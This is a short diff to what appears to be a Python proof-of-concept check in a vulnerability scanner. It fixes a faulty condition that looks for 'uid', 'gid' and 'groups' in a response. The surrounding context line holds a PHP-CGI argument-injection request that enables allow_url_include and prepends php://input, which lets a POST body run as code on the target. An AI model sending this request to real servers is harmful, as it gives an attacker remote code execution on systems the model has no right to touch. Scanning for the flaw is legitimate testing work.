@@ -38,7 +38,7 @@ class Poc(ABPoc):
             request = requests.post('{target}/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'.format(target=self.target), data=data)
             r = request.text
 
-            if 'uid' and 'gid' and 'groups' in r:
+            if 'uid' in r and 'gid' in r and 'groups' in r:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
